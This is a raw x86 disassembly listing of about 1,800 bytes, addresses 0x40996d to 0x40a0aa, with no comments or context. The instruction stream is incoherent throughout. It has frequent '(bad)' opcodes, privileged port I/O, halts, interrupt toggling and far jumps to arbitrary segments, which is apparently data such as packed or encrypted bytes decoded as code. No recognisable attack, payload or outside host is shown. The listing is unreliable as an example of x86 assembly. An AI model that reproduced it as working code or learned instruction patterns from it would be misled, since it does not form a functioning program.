  40996d:	out    dx,eax
  40996e:	pop    DWORD PTR [esi-0x4e]
  409971:	mov    bl,cl
  409973:	add    al,0x49
  409975:	ja     0x40996e
  409977:	repz or ch,BYTE PTR [esi-0x1b47682d]
  40997e:	jge    0x40993c
  409980:	in     eax,dx
  409981:	mov    dl,0x9a
  409983:	xor    DWORD PTR [esp+edx*8],esp
  409986:	ret    0x91a9
  409989:	fnsave [edi-0xd2d63fd]
  40998f:	push   ebp
  409990:	repz pop ebp
  409992:	mov    esi,0x8df7f107
  409997:	repnz scas al,BYTE PTR es:[edi]
  409999:	sub    DWORD PTR [edi],esi
  40999b:	call   0x38ad:0x14c06187
  4099a2:	scas   eax,DWORD PTR es:[edi]
  4099a3:	sahf   
  4099a4:	sets   BYTE PTR [ebx]
  4099a7:	dec    ecx
  4099a8:	in     eax,dx
  4099a9:	or     DWORD PTR [ebx+0x77],0x4e
  4099ad:	inc    esp
  4099ae:	xor    DWORD PTR [esi-0x4592df4b],ebp
  4099b4:	cli    
  4099b5:	dec    ebp
  4099b6:	aas    
  4099b7:	push   esp
  4099b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099b9:	push   ebx
  4099ba:	mov    al,ds:0x31531922
  4099bf:	int3   
  4099c0:	in     eax,dx
  4099c1:	or     al,0x37
  4099c3:	stc    
  4099c4:	xor    bl,BYTE PTR [ebp-0x14]
  4099c7:	and    cl,al
  4099c9:	ss push ebp
  4099cb:	mov    dl,0x81
  4099cd:	pop    edx
  4099ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099cf:	sbb    al,BYTE PTR [edx+0x7e]
  4099d2:	popa   
  4099d3:	arpl   WORD PTR [esi],bx
  4099d5:	mov    ds:0xad7131fa,eax
  4099da:	sbb    al,0x9f
  4099dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099dd:	jae    0x4099e4
  4099df:	(bad)  
  4099e0:	mov    ecx,0x8736d643
  4099e5:	fisubr DWORD PTR ds:0xa1a1987d
  4099eb:	test   eax,0x57976e36
  4099f0:	mov    BYTE PTR [esi-0x7b3a134f],ch
  4099f6:	mov    dl,0x95
  4099f8:	xchg   esp,eax
  4099f9:	in     eax,dx
  4099fa:	jmp    0x4099cc
  4099fc:	sti    
  4099fd:	mov    ecx,0x1f3b43ad
  409a02:	jae    0x4099b4
  409a04:	xchg   edx,eax
  409a05:	aam    0xc6
  409a07:	xchg   esi,eax
  409a08:	mov    ah,0x5e
  409a0a:	xor    bl,BYTE PTR [eax-0x8729ef]
  409a10:	lds    ebx,FWORD PTR [esp+edx*8]
  409a13:	ds push cs
  409a15:	(bad)  
  409a17:	cmp    DWORD PTR [ecx],esp
  409a19:	xlat   BYTE PTR ds:[ebx]
  409a1a:	imul   ebx,DWORD PTR [ebx+0x4a],0xffffffbd
  409a1e:	push   esp
  409a1f:	fist   DWORD PTR [ebx-0x2e]
  409a22:	ret    0xce48
  409a25:	jbe    0x409a6e
  409a27:	sar    BYTE PTR [esi+0x3e1711bc],0x11
  409a2e:	mov    WORD PTR [edi],es
  409a30:	sub    ch,BYTE PTR [ecx]
  409a32:	push   eax
  409a33:	shl    DWORD PTR [ecx],cl
  409a35:	outs   dx,DWORD PTR ds:[esi]
  409a36:	sub    al,0x88
  409a38:	xchg   ecx,eax
  409a39:	push   ds
  409a3a:	push   esi
  409a3b:	scas   eax,DWORD PTR es:[edi]
  409a3c:	outs   dx,DWORD PTR ds:[esi]
  409a3d:	inc    ebx
  409a3e:	xor    DWORD PTR [ebp+0x6d],ecx
  409a41:	pop    ss
  409a42:	push   ss
  409a43:	inc    ecx
  409a44:	enter  0x3a70,0xd5
  409a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a49:	adc    BYTE PTR [eax+edx*2+0x5dfdcb10],al
  409a50:	sub    al,0x5b
  409a52:	loope  0x409ac3
  409a54:	or     BYTE PTR [ecx-0x6],bh
  409a57:	fcomp  DWORD PTR [eax-0x35]
  409a5a:	sbb    bl,ah
  409a5c:	xor    al,0x7a
  409a5e:	adc    esp,DWORD PTR [ebp+edx*4+0x572c7798]
  409a65:	xchg   esi,eax
  409a66:	(bad)  
  409a67:	in     al,dx
  409a68:	xlat   BYTE PTR cs:[ebx]
  409a6a:	inc    esi
  409a6b:	sbb    DWORD PTR [ebx+0x53317611],esp
  409a71:	adc    al,0xa7
  409a73:	out    dx,eax
  409a74:	jo     0x409a10
  409a76:	bound  ecx,QWORD PTR [esi-0x41]
  409a79:	mov    eax,ebx
  409a7b:	(bad)  
  409a7c:	stc    
  409a7d:	jge    0x409aa4
  409a7f:	clc    
  409a80:	adc    al,al
  409a82:	loop   0x409a49
  409a84:	ins    BYTE PTR es:[edi],dx
  409a85:	mov    WORD PTR [ecx],cs
  409a87:	sub    edx,DWORD PTR [ebx]
  409a89:	jmp    DWORD PTR [ecx-0x3f061f4]
  409a8f:	mov    eax,0x74990ab1
  409a94:	stos   DWORD PTR es:[edi],eax
  409a95:	idiv   BYTE PTR [eax]
  409a97:	jbe    0x409ab5
  409a99:	stos   BYTE PTR es:[edi],al
  409a9a:	cmp    al,0xff
  409a9c:	shl    DWORD PTR [ecx],cl
  409a9e:	scas   al,BYTE PTR es:[edi]
  409a9f:	inc    eax
  409aa0:	pop    edx
  409aa1:	fimul  WORD PTR [edi+0x43881630]
  409aa7:	push   ecx
  409aa8:	ror    DWORD PTR gs:[ebx-0x3a],0x51
  409aad:	stos   BYTE PTR es:[edi],al
  409aae:	cmp    DWORD PTR [edx-0x34e736fd],eax
  409ab4:	push   ebp
  409ab5:	lock xchg esi,eax
  409ab7:	sti    
  409ab8:	lock mov al,dl
  409abb:	or     eax,0x3b8defa6
  409ac0:	ins    DWORD PTR es:[edi],dx
  409ac1:	fimul  DWORD PTR [ebp+0x3e]
  409ac4:	fwait
  409ac5:	jbe    0x409a5b
  409ac7:	ret    
  409ac8:	pusha  
  409ac9:	or     ebx,DWORD PTR [edi]
  409acb:	add    ch,cl
  409acd:	fcomp  DWORD PTR [ecx+edi*4]
  409ad0:	mov    edi,DWORD PTR [eax-0x34]
  409ad3:	or     BYTE PTR [ebx],cl
  409ad5:	je     0x409a75
  409ad7:	nop
  409ad8:	fadd   QWORD PTR [edi]
  409ada:	and    eax,0xad96e170
  409adf:	imul   bh
  409ae1:	mov    al,0x91
  409ae3:	sub    DWORD PTR [ebx],edx
  409ae5:	jnp    0x409b4d
  409ae7:	repnz adc DWORD PTR [esi],esp
  409aea:	lahf   
  409aeb:	inc    edx
  409aec:	mov    ebp,0xaec1acde
  409af1:	sahf   
  409af2:	lods   eax,DWORD PTR ds:[esi]
  409af3:	xchg   edi,eax
  409af4:	push   cs
  409af5:	add    al,0x9b
  409af7:	pop    esp
  409af8:	xchg   edx,eax
  409af9:	fbld   TBYTE PTR [ebx+edi*8-0x39b64444]
  409b00:	js     0x409ab8
  409b02:	sub    al,0x9b
  409b04:	in     al,0xd7
  409b06:	mov    ch,0x9d
  409b08:	push   ebp
  409b09:	stos   BYTE PTR es:[edi],al
  409b0a:	inc    edx
  409b0b:	mov    edi,DWORD PTR [edi+eiz*4+0x58b89a3b]
  409b12:	iret   
  409b13:	das    
  409b14:	lods   eax,DWORD PTR ds:[esi]
  409b15:	inc    edi
  409b16:	push   cs
  409b17:	std    
  409b18:	fld    QWORD PTR [ecx+0x6c502d90]
  409b1e:	jg     0x409b2a
  409b20:	jae    0x409ad8
  409b22:	mov    edi,0x7a8a9cb8
  409b27:	lods   ax,WORD PTR ds:[esi]
  409b29:	scas   eax,DWORD PTR es:[edi]
  409b2a:	aam    0xc5
  409b2c:	outs   dx,DWORD PTR ds:[esi]
  409b2d:	pushf  
  409b2e:	pop    edi
  409b2f:	add    al,BYTE PTR [ecx-0x78efead5]
  409b35:	mov    DWORD PTR [edx+0x5],ebp
  409b38:	adc    DWORD PTR [ebx+0x4951165c],0x654ceeb9
  409b42:	das    
  409b43:	add    eax,0x65711943
  409b48:	sub    DWORD PTR [ecx],ecx
  409b4a:	cs scas al,BYTE PTR es:[edi]
  409b4c:	or     ebx,ecx
  409b4e:	push   eax
  409b4f:	jp     0x409b1d
  409b51:	je     0x409b31
  409b53:	xor    ah,BYTE PTR [ecx-0x52e2b9b7]
  409b59:	inc    edi
  409b5a:	jl     0x409b4c
  409b5c:	jmp    0x409b5a
  409b5e:	pop    eax
  409b5f:	ds int3 
  409b61:	pop    eax
  409b62:	fsubr  DWORD PTR [edi+ebp*2+0x31]
  409b66:	sti    
  409b67:	xor    ebx,esi
  409b69:	ret    
  409b6a:	fld    QWORD PTR [eax-0xa]
  409b6d:	sahf   
  409b6e:	test   DWORD PTR [ebp+edx*4+0x7a],edi
  409b72:	es mov bh,0xf2
  409b75:	push   ebp
  409b76:	in     eax,0xc7
  409b78:	dec    edi
  409b79:	lea    esi,[eax+0x73]
  409b7c:	mov    eax,DWORD PTR [edx-0x18]
  409b7f:	jge    0x409bb2
  409b81:	push   ecx
  409b82:	je     0x409b3a
  409b84:	dec    ecx
  409b85:	jb     0x409bbf
  409b87:	ds out dx,eax
  409b89:	jmp    0x409b66
  409b8b:	or     al,0x42
  409b8d:	cdq    
  409b8e:	mov    ch,0xd5
  409b90:	mov    dh,0x94
  409b92:	movlps QWORD PTR [ebx-0x5f19c2a0],xmm7
  409b99:	aam    0x68
  409b9b:	sub    ebp,DWORD PTR [esi-0x61]
  409b9e:	loop   0x409b39
  409ba0:	jmp    0x82dc866d
  409ba5:	push   eax
  409ba6:	sub    ebp,DWORD PTR [edi+0x2a]
  409ba9:	cmp    BYTE PTR [esi+0x44],al
  409bac:	inc    esp
  409bad:	or     ebp,ecx
  409baf:	mov    ch,0x10
  409bb1:	and    BYTE PTR [ebx],bl
  409bb3:	loope  0x409bdb
  409bb5:	scas   al,BYTE PTR es:[edi]
  409bb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bb7:	leave  
  409bb8:	pop    ecx
  409bb9:	fbld   TBYTE PTR [edx+ebx*4]
  409bbc:	popf   
  409bbd:	sub    esi,ecx
  409bbf:	inc    eax
  409bc0:	aam    0xcc
  409bc2:	pop    ecx
  409bc3:	es mov dl,0x61
  409bc6:	sbb    BYTE PTR [ecx+0x12ee0c1a],0x50
  409bcd:	add    dh,BYTE PTR [eax+0x47]
  409bd0:	pop    ds
  409bd1:	out    0xf6,eax
  409bd3:	cli    
  409bd4:	les    ecx,FWORD PTR [ebp+0x6a8508bd]
  409bda:	pop    esp
  409bdb:	cmp    BYTE PTR [eax],ah
  409bdd:	push   ebx
  409bde:	pusha  
  409bdf:	(bad)  
  409be0:	xor    al,0xf4
  409be2:	xchg   esp,eax
  409be3:	pcmpeqw mm3,QWORD PTR [edx-0x2a]
  409be7:	(bad)  
  409be8:	mov    al,ds:0x3644614d
  409bed:	inc    edx
  409bee:	shl    DWORD PTR [ecx-0x7170fde0],1
  409bf4:	cmp    ah,BYTE PTR [ebx-0x37]
  409bf7:	cmp    ch,BYTE PTR [ecx]
  409bf9:	out    dx,eax
  409bfa:	mov    ebx,0xda2bee6b
  409bff:	(bad)  
  409c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c02:	inc    esp
  409c03:	mov    ah,0x7d
  409c05:	mov    dl,0x21
  409c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c08:	aaa    
  409c09:	stc    
  409c0a:	in     eax,0x6
  409c0c:	inc    ebx
  409c0d:	pop    ebx
  409c0e:	push   cs
  409c0f:	pushf  
  409c10:	hlt    
  409c11:	xchg   esp,eax
  409c12:	dec    eax
  409c13:	(bad)  
  409c14:	es inc edi
  409c16:	sbb    BYTE PTR [edi-0x27ff972f],al
  409c1c:	xor    ch,BYTE PTR [edx]
  409c1e:	mov    esi,0xebc55b6b
  409c23:	stos   DWORD PTR es:[edi],eax
  409c24:	and    cl,bl
  409c26:	push   0x6d
  409c28:	outs   dx,DWORD PTR ds:[esi]
  409c29:	jmp    0x1678f3dc
  409c2e:	lea    ebx,[edx+edi*8+0x372d958f]
  409c35:	rol    ch,0xdc
  409c38:	mov    al,ds:0xf6f69a0f
  409c3d:	push   ecx
  409c3e:	bound  ebp,QWORD PTR [esi-0x76ae5c72]
  409c44:	inc    ebx
  409c45:	push   es
  409c46:	cli    
  409c47:	std    
  409c48:	nop
  409c49:	mov    bh,0xc3
  409c4b:	and    eax,0x675267f
  409c50:	call   0x50d34e16
  409c55:	sub    DWORD PTR [ebx+0x2b89dd9d],0x6807740
  409c5f:	add    DWORD PTR [ecx],edx
  409c61:	aaa    
  409c62:	dec    ebp
  409c63:	cmp    DWORD PTR [esp+edx*4],esp
  409c66:	mov    cl,0x67
  409c68:	cld    
  409c69:	inc    esp
  409c6a:	push   esi
  409c6b:	je     0x409cbc
  409c6d:	mov    bh,0x9b
  409c6f:	lock fsubr st(4),st
  409c72:	xor    ebp,DWORD PTR ds:0x1b41f5c2
  409c78:	aaa    
  409c79:	xchg   DWORD PTR [ecx+0x4c60ea60],edi
  409c7f:	ja     0x409c6b
  409c81:	mov    edi,0xd4c06d0a
  409c86:	and    dh,BYTE PTR [eax]
  409c88:	out    0x2f,eax
  409c8a:	mov    cl,0xe5
  409c8c:	pusha  
  409c8d:	dec    ebp
  409c8e:	out    0x49,eax
  409c90:	outs   dx,DWORD PTR ds:[esi]
  409c91:	hlt    
  409c92:	dec    edx
  409c93:	xor    eax,0x3e58d9ca
  409c98:	or     BYTE PTR [ebx],dh
  409c9a:	jmp    0x944ec3a4
  409c9f:	mov    bl,0x38
  409ca1:	push   0x64
  409ca3:	daa    
  409ca4:	popa   
  409ca5:	mov    WORD PTR [eax],es
  409ca7:	cs push 0x66
  409caa:	pop    edi
  409cab:	mov    ds,WORD PTR [esi+ebx*2+0x5d]
  409caf:	cmp    dh,ch
  409cb1:	cmp    dh,bl
  409cb3:	lods   eax,DWORD PTR ds:[esi]
  409cb4:	sbb    eax,0xf75e2493
  409cb9:	jns    0x409cc9
  409cbb:	test   eax,0x2a16a574
  409cc0:	mov    edi,0x113c3542
  409cc5:	js     0x409d34
  409cc7:	and    al,0xb8
  409cc9:	stc    
  409cca:	xchg   esp,eax
  409ccb:	cli    
  409ccc:	es pop ds
  409cce:	jmp    0x6368895a
  409cd3:	cwde   
  409cd4:	ret    0x6e1f
  409cd7:	mov    esi,0x58370c0a
  409cdc:	cmp    dl,dl
  409cde:	mov    edx,0xb4432b4b
  409ce3:	push   ebp
  409ce4:	push   edx
  409ce5:	out    0x8b,al
  409ce7:	jecxz  0x409d47
  409ce9:	fs mov ebx,0xd66e4637
  409cef:	xchg   esi,eax
  409cf0:	jno    0x409d21
  409cf2:	or     al,0x35
  409cf4:	pop    edx
  409cf5:	pop    eax
  409cf6:	mov    edi,0xabdee971
  409cfb:	bound  edi,QWORD PTR [edx+ecx*8-0x51]
  409cff:	stc    
  409d00:	sub    eax,0xcd8cc4ab
  409d05:	or     edx,ecx
  409d07:	iret   
  409d08:	(bad)  
  409d09:	pop    eax
  409d0a:	jg     0x409d80
  409d0c:	cmp    dl,BYTE PTR [esi+0x8]
  409d0f:	out    0xe7,al
  409d11:	repz cdq 
  409d13:	add    al,0xe
  409d15:	push   eax
  409d16:	adc    DWORD PTR [ebx+0x541bc11b],esp
  409d1c:	data16 xor al,0xc
  409d1f:	mov    ah,0x62
  409d21:	out    0x31,eax
  409d23:	cs inc edi
  409d25:	rol    edx,cl
  409d27:	aad    0xa6
  409d29:	cwde   
  409d2a:	repnz mov esi,0x998da0a7
  409d30:	mov    ds:0x733632f8,eax
  409d35:	jle    0x409d32
  409d37:	push   eax
  409d38:	push   esi
  409d39:	jne    0x409d11
  409d3b:	jge    0x409d68
  409d3d:	(bad)  
  409d3e:	push   edi
  409d3f:	inc    edi
  409d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d41:	sub    esp,DWORD PTR [ebp+0x2667ed4f]
  409d47:	mov    ebp,DWORD PTR [esp+esi*8]
  409d4a:	push   ss
  409d4b:	sub    eax,0x59d8d32e
  409d50:	sub    BYTE PTR [ebx+0x5dcbd35b],ch
  409d56:	scas   al,BYTE PTR es:[edi]
  409d57:	hlt    
  409d58:	add    al,0xd2
  409d5a:	xlat   BYTE PTR ds:[ebx]
  409d5b:	int    0x6c
  409d5d:	aaa    
  409d5e:	adc    ebp,DWORD PTR [ecx-0x7f]
  409d61:	pop    esi
  409d62:	rcr    BYTE PTR [edi],cl
  409d64:	stc    
  409d65:	mov    al,0x9e
  409d67:	lock sbb BYTE PTR [ecx],ch
  409d6a:	cli    
  409d6b:	leave  
  409d6c:	add    eax,0x40b2b4ff
  409d71:	stos   DWORD PTR es:[edi],eax
  409d72:	jmp    0x409d7e
  409d74:	icebp  
  409d75:	scas   al,BYTE PTR es:[edi]
  409d76:	xor    BYTE PTR [esi-0x7c],0x89
  409d7a:	cmp    al,0xf4
  409d7c:	sahf   
  409d7d:	add    edx,ebx
  409d7f:	inc    edx
  409d80:	jecxz  0x409d92
  409d82:	mov    dl,BYTE PTR [esi+0x1843c2ac]
  409d88:	(bad)  
  409d89:	iret   
  409d8a:	lods   eax,DWORD PTR ds:[esi]
  409d8b:	jae    0x409d2a
  409d8d:	stc    
  409d8e:	ins    DWORD PTR es:[edi],dx
  409d8f:	mov    WORD PTR [eax+0x5e],?
  409d92:	jl     0x409d28
  409d94:	xchg   edx,eax
  409d95:	out    dx,eax
  409d96:	out    0xaa,eax
  409d98:	arpl   WORD PTR [ebp-0x3f339d80],bx
  409d9e:	push   0x379677af
  409da3:	daa    
  409da4:	adc    ch,BYTE PTR [ecx+esi*1]
  409da7:	or     BYTE PTR [ebp-0x66f5288b],al
  409dad:	imul   eax,DWORD PTR [ebp-0xf],0x878550d3
  409db4:	inc    edx
  409db5:	cmp    al,0xf0
  409db7:	mov    ah,0xf2
  409db9:	pop    edi
  409dba:	sbb    al,0xb8
  409dbc:	cmc    
  409dbd:	enter  0x6c47,0x48
  409dc1:	xchg   edi,eax
  409dc2:	arpl   WORD PTR [edi],bp
  409dc4:	sub    al,0x3d
  409dc6:	lahf   
  409dc7:	and    DWORD PTR [esi+edx*8+0x46753d86],esp
  409dce:	mov    ch,cl
  409dd0:	xor    eax,0x7232f7dc
  409dd5:	or     ecx,edi
  409dd7:	lods   al,BYTE PTR ds:[esi]
  409dd8:	aas    
  409dd9:	lahf   
  409dda:	xchg   esp,eax
  409ddb:	cli    
  409ddc:	fdivr  QWORD PTR [esi+0x51]
  409ddf:	xchg   esi,eax
  409de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409de1:	inc    eax
  409de2:	mov    ch,0xd5
  409de4:	mov    ebx,0x6622d743
  409de9:	dec    edi
  409dea:	call   ebx
  409dec:	ss in  eax,dx
  409dee:	in     al,dx
  409def:	loope  0x409e5f
  409df1:	jmp    0x9508:0xa81a68e2
  409df8:	out    dx,eax
  409df9:	lds    esi,FWORD PTR [esi+0x798aec97]
  409dff:	loope  0x409e6e
  409e01:	inc    ecx
  409e02:	and    esi,DWORD PTR [edi+0x0]
  409e05:	jg     0x409e02
  409e07:	and    eax,0x8c30b4a5
  409e0c:	push   esp
  409e0d:	cli    
  409e0e:	mov    ebp,0x4b9ab54c
  409e13:	jmp    0x4db0:0x93d94506
  409e1a:	retf   0x3f12
  409e1d:	rcr    edi,0x12
  409e20:	cmp    BYTE PTR [esi+0x6ab4a38],al
  409e26:	push   eax
  409e27:	jl     0x409e96
  409e29:	rcl    ebp,1
  409e2b:	xchg   esp,eax
  409e2c:	mov    ds:0x355bb4,al
  409e31:	mov    ebp,cs
  409e33:	inc    esp
  409e34:	dec    edx
  409e35:	loope  0x409df1
  409e37:	mov    eax,0x8c0ab7f7
  409e3c:	adc    BYTE PTR [edi+0x40],0xd
  409e40:	xchg   DWORD PTR ds:0x4230aec0,esi
  409e46:	iret   
  409e47:	cmc    
  409e48:	and    al,0x19
  409e4a:	and    al,0x88
  409e4c:	popf   
  409e4d:	popf   
  409e4e:	sbb    al,0xb9
  409e50:	dec    eax
  409e51:	push   eax
  409e52:	test   DWORD PTR [esp+ebx*2+0x47f09c9e],ecx
  409e59:	xchg   esi,eax
  409e5a:	rol    dl,1
  409e5c:	fidivr WORD PTR [edi+0x75]
  409e5f:	xchg   BYTE PTR [ebp-0x14],al
  409e62:	fst    st(4)
  409e64:	xchg   esi,eax
  409e65:	and    bh,BYTE PTR [ecx]
  409e67:	retf   0xa466
  409e6a:	jnp    0x409e9f
  409e6c:	mov    edx,esp
  409e6e:	sbb    DWORD PTR [eax],edx
  409e70:	ins    BYTE PTR es:[edi],dx
  409e71:	fucomip st,st(4)
  409e73:	mov    dl,0x96
  409e75:	jb     0x409e3c
  409e77:	mov    bl,0xe5
  409e79:	rol    BYTE PTR [edx-0x59608b04],0x53
  409e80:	dec    ebp
  409e81:	fild   WORD PTR ds:0x1476c80d
  409e87:	cli    
  409e88:	fs (bad) 
  409e8a:	cli    
  409e8b:	ret    0xf02d
  409e8e:	add    eax,DWORD PTR [ebx]
  409e90:	cwde   
  409e91:	sahf   
  409e92:	or     cl,dl
  409e94:	xor    dh,BYTE PTR [eax+edx*4-0x72]
  409e98:	lahf   
  409e99:	mov    edi,0xad0e3eb
  409e9e:	das    
  409e9f:	xchg   edi,eax
  409ea0:	mov    cl,0x71
  409ea2:	dec    esi
  409ea3:	inc    ecx
  409ea4:	jno    0x409e51
  409ea6:	dec    eax
  409ea7:	mov    ds:0xded04beb,eax
  409eac:	push   edx
  409ead:	fadd   DWORD PTR [eax+0x5e7b918c]
  409eb3:	(bad)  
  409eb4:	push   ds
  409eb5:	and    bl,ch
  409eb7:	jp     0x409eec
  409eb9:	clc    
  409eba:	loop   0x409ebf
  409ebc:	jmp    0xce72ed86
  409ec1:	lock and al,0xc8
  409ec4:	mov    al,ds:0x1b5fb9be
  409ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eca:	fist   WORD PTR [esi]
  409ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ecd:	sub    ecx,DWORD PTR [edx-0x22]
  409ed0:	pop    ebx
  409ed1:	lock shl BYTE PTR [edx+edx*8],1
  409ed5:	cmp    edx,0xd
  409ed8:	lods   al,BYTE PTR ds:[esi]
  409ed9:	or     al,0xf8
  409edb:	stos   BYTE PTR es:[edi],al
  409edc:	fs loopne 0x409f06
  409edf:	into   
  409ee0:	cs inc eax
  409ee2:	lds    edi,FWORD PTR [edi-0x1ad9d26d]
  409ee8:	sti    
  409ee9:	les    ebx,FWORD PTR [ecx-0x1fa6d1fb]
  409eef:	xchg   esi,eax
  409ef0:	(bad)  
  409ef1:	mov    DWORD PTR [edx-0x6cc8aae2],eax
  409ef7:	xor    bh,BYTE PTR [edi+0x58]
  409efa:	shl    BYTE PTR [edi+0x684296a5],1
  409f00:	jno    0x409f79
  409f02:	pop    esp
  409f03:	sbb    al,0x3b
  409f05:	daa    
  409f06:	dec    esi
  409f07:	add    bh,dh
  409f09:	or     cl,BYTE PTR [esi-0x15]
  409f0c:	xchg   DWORD PTR [eax+ecx*2],eax
  409f0f:	xor    ecx,edi
  409f11:	push   ebp
  409f12:	cmp    eax,0xb12aaf01
  409f17:	dec    eax
  409f18:	and    ebp,DWORD PTR ds:0x77c9c1e2
  409f1e:	pop    edi
  409f1f:	mov    ebx,0xb2f34bb3
  409f24:	fsubr  DWORD PTR gs:[ebx+0x419763ea]
  409f2b:	ja     0x409ef2
  409f2d:	in     al,dx
  409f2e:	retf   
  409f2f:	cmp    esp,DWORD PTR [edx-0x41]
  409f32:	imul   edx,DWORD PTR [edx+0x68],0x38
  409f36:	jb     0x409f37
  409f38:	ror    BYTE PTR ds:0x4059c1f2,cl
  409f3e:	pusha  
  409f3f:	dec    edx
  409f40:	cmp    BYTE PTR [ecx+ebx*1],dh
  409f43:	dec    edx
  409f44:	ds addr16 add edx,eax
  409f48:	call   0x72276b2
  409f4d:	dec    ebp
  409f4e:	xchg   edi,eax
  409f4f:	data16 daa 
  409f51:	cmc    
  409f52:	ret    0xc619
  409f55:	cmp    bh,bh
  409f57:	pop    ebp
  409f58:	and    DWORD PTR [ecx],esp
  409f5a:	mov    cl,0x11
  409f5c:	mov    ds:0xe23390f7,al
  409f61:	or     ecx,DWORD PTR [ebx+0xfab6ed5]
  409f67:	ret    
  409f68:	in     eax,0xf4
  409f6a:	add    DWORD PTR [ecx+edi*4-0x3c],ecx
  409f6e:	mov    edx,DWORD PTR [edx+0x4c]
  409f71:	out    dx,eax
  409f72:	or     al,0xab
  409f74:	popa   
  409f75:	clc    
  409f76:	mov    dl,0xaa
  409f78:	jo     0x409f03
  409f7a:	adc    ch,dh
  409f7c:	frstor [ecx]
  409f7e:	xchg   DWORD PTR [edx],ebp
  409f80:	mov    BYTE PTR [ebp-0x77624648],ch
  409f86:	xor    cl,BYTE PTR [ecx+0x7]
  409f89:	inc    esp
  409f8a:	fs scas eax,DWORD PTR es:[edi]
  409f8c:	jo     0x409ffe
  409f8e:	push   esi
  409f8f:	cwde   
  409f90:	sahf   
  409f91:	push   es
  409f92:	jae    0x409f68
  409f94:	in     eax,dx
  409f95:	adc    eax,0xbf74fcc5
  409f9a:	mov    edi,0x8c2b7e2f
  409f9f:	dec    eax
  409fa0:	les    ecx,FWORD PTR [esi-0x3]
  409fa3:	repnz xor al,0x5b
  409fa6:	scas   eax,DWORD PTR es:[edi]
  409fa7:	inc    esi
  409fa8:	xchg   edi,esp
  409faa:	jl     0x409ff2
  409fac:	sbb    cl,BYTE PTR ss:[edi+0x3]
  409fb0:	xor    ch,BYTE PTR [ebx]
  409fb2:	rol    BYTE PTR [eax],1
  409fb4:	xlat   BYTE PTR ds:[ebx]
  409fb5:	gs push ds
  409fb7:	imul   dh
  409fb9:	inc    edx
  409fba:	cdq    
  409fbb:	inc    ebx
  409fbc:	adc    DWORD PTR [ebp-0x231d453],0x76
  409fc3:	mov    dh,0x75
  409fc5:	push   0x33b4a543
  409fca:	adc    dl,0x2
  409fcd:	rol    DWORD PTR [esi+0xdc695dd],1
  409fd3:	inc    edi
  409fd4:	das    
  409fd5:	sbb    ebx,DWORD PTR [edi]
  409fd7:	outs   dx,DWORD PTR ds:[esi]
  409fd8:	and    ch,dl
  409fda:	pusha  
  409fdb:	je     0x409fde
  409fdd:	cmp    BYTE PTR [edx+edi*1-0x2d],dl
  409fe1:	inc    edi
  409fe2:	fsubrp st(6),st
  409fe4:	outs   dx,DWORD PTR ds:[esi]
  409fe5:	sti    
  409fe6:	repz jecxz 0x409fd9
  409fe9:	(bad)  
  409fea:	not    al
  409fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fed:	aaa    
  409fee:	cmp    ebp,DWORD PTR [edx-0xa45a467]
  409ff4:	aaa    
  409ff5:	sahf   
  409ff6:	ss das 
  409ff8:	mov    ebp,?
  409ffa:	ins    BYTE PTR es:[edi],dx
  409ffb:	sar    DWORD PTR [edx+0x6d],1
  409ffe:	jecxz  0x409fe5
  40a000:	into   
  40a001:	cld    
  40a002:	iret   
  40a003:	adc    BYTE PTR [eax+0x15],bh
  40a006:	add    esp,eax
  40a008:	and    ch,0x2d
  40a00b:	fcomp  DWORD PTR [edi-0x5]
  40a00e:	pop    es
  40a00f:	mov    WORD PTR [esi],ds
  40a011:	ret    
  40a012:	dec    edx
  40a013:	push   eax
  40a014:	and    ebp,DWORD PTR [edi+ebx*8]
  40a017:	or     eax,0xed0d8435
  40a01c:	fild   QWORD PTR [ebp-0x40]
  40a01f:	pop    edi
  40a020:	mov    eax,ds:0xd7f993a1
  40a025:	mov    eax,ebx
  40a027:	iret   
  40a028:	xchg   esi,eax
  40a029:	aad    0x9c
  40a02b:	(bad)  
  40a02c:	or     al,0xaa
  40a02e:	das    
  40a02f:	inc    esi
  40a030:	test   eax,0xa093eed9
  40a035:	loop   0x40a068
  40a037:	push   ds
  40a038:	(bad)  
  40a039:	xchg   ecx,eax
  40a03a:	jmp    0x1a33c335
  40a03f:	mov    dh,0xec
  40a041:	test   BYTE PTR [ebp-0x386c1308],0xd8
  40a048:	pop    edx
  40a049:	push   ecx
  40a04a:	mov    ebx,0x1694e0f9
  40a04f:	cdq    
  40a050:	xchg   BYTE PTR [ebx],ch
  40a052:	enter  0xd33a,0x4b
  40a056:	cld    
  40a057:	lahf   
  40a058:	xchg   DWORD PTR [eax+0x74b267b7],ebp
  40a05e:	jbe    0x409feb
  40a060:	pop    ss
  40a061:	pop    es
  40a062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a063:	push   0xa29d4ad8
  40a068:	out    dx,eax
  40a069:	(bad)  
  40a06a:	ficom  WORD PTR [edx-0x234d0794]
  40a070:	adc    ebx,esp
  40a072:	mov    dl,BYTE PTR [edi+esi*2]
  40a075:	mov    ecx,cs
  40a077:	jb     0x40a0ac
  40a079:	mov    cl,0xf0
  40a07b:	(bad)  
  40a07c:	in     eax,dx
  40a07d:	or     DWORD PTR [ecx+0x2e8b15a2],0x1e
  40a084:	pusha  
  40a085:	dec    esp
  40a086:	xchg   ebp,eax
  40a087:	jecxz  0x40a02d
  40a089:	cld    
  40a08a:	and    al,0x2a
  40a08c:	mov    ecx,0x53464aa8
  40a091:	sbb    DWORD PTR [ecx+ebp*8+0x5d],edi
  40a095:	(bad)  [eax]
  40a097:	and    esi,DWORD PTR [edx+0x1e]
  40a09a:	mov    esp,0xec1f246b
  40a09f:	mov    al,ds:0x8568efdb
  40a0a4:	dec    ebp
  40a0a5:	mov    bh,0xc
  40a0a7:	jo     0x40a0fa
  40a0a9:	lods   al,BYTE PTR ds:[esi]
  40a0aa:	xchg   esp,eax
